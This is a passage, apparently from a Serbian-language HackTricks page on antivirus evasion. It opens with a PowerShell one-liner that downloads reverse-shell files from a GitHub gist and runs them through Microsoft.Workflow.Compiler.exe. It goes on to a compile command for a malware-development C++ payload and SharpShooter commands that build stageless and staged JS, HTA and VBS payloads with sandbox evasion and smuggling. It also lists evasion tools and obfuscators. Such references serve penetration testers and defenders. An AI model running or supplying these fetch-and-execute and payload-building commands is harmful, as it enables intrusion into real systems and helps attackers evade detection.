powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Pythona za primer izgradnje injektora:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **karijeru u hakovanju** i da hakujete nehakovano - **zapošljavamo!** (_potrebno je tečno pisanje i govorenje poljskog_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite trikove za hakovanje slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
